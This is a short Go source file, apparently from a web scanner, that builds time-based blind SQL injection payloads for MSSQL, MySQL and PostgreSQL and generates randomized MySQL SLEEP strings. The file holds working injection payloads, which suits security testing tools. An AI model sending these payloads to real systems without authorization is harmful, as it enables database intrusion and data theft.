package blind_injection

import (
	"fmt"
	"math/rand"
	"time"
)

var seconds = 5
var timeStrings = map[string]string{
	"MSQL":   "' wait for delay '00:00:10' -- ",
	"MySQL":  "' and (select 8921 from (select(sleep(5)))jUim) -- ",
	"MySQL2": "' benchmark(5000000, rand()) -- ",
	"PGSQL":  "' pg_sleep() -- ",
}

type timeStringer interface {
	timeQuery() string
}

type mySQLStringer struct {
	base string
}

func newMySQL() mySQLStringer {
	return mySQLStringer{base: "' AND (SELECT %d FROM (SELECT(SLEEP(%d)))%s)-- "}
}

func (m mySQLStringer) timeQuery() string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	d := r.Uint64()
	s := randomString(4)
	return fmt.Sprintf(m.base, d, seconds, s)
}

var asciiTable = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func randomString(l int) string {
	b := make([]byte, l)
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < l; i++ {
		b[i] = asciiTable[r.Intn(len(asciiTable))]
	}

	return string(b)
}
